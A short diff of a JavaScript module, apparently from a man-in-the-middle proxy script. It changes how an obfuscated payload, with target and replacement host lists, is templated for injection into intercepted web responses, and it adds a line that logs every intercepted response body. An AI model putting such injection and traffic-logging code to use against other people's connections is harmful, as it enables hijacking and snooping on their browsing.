@@ -5,6 +5,7 @@ var payload,
     payload_container = "" + 
     	"if (!self.{{session_id}}) {\n" + 
     		"var {{session_id}} = function() {\n" + 
+    			"{{variables}}\n" + 
     			"{{payload}}\n" + 
     			"{{custom_payload}}\n" + 
     		"}\n" + 
@@ -88,8 +89,8 @@ function configure() {
 	payload = payload_container.replace("{{payload}}", payload)
 	payload = payload.replace(/\{\{session_id\}\}/g, session_id)
 	payload = payload.replace("obf_path_callback", callback_path)
-	payload = payload.replace( "{{custom_payload}}", "{{custom_payload}}" + "var " + var_replacement_hosts + " = [\"" + replacement_hosts.join("\",\"") + "\"]\n" )
-	payload = payload.replace( "{{custom_payload}}", "{{custom_payload}}" + "\nvar " + var_target_hosts + " = [\"" + target_hosts.join("\",\"") + "\"]\n" )
+	payload = payload.replace( "{{variables}}", "{{variables}}\nvar " + var_replacement_hosts + " = [\"" + replacement_hosts.join("\",\"") + "\"]\n" )
+	payload = payload.replace( "{{variables}}", "var " + var_target_hosts + " = [\"" + target_hosts.join("\",\"") + "\"]" )
 	// Obfuscate payload
 	payload = payload.replace(/obf_var_replacement_hosts/g, var_replacement_hosts)
 	payload = payload.replace(/obf_var_target_hosts/g, var_target_hosts)
@@ -366,4 +367,5 @@ function onResponse(req, res) {
 		res.SetHeader("Access-Control-Allow-Methods", "*")
 		res.SetHeader("Access-Control-Allow-Headers", "*")
 	}
+	console.log(res.Body)
 }
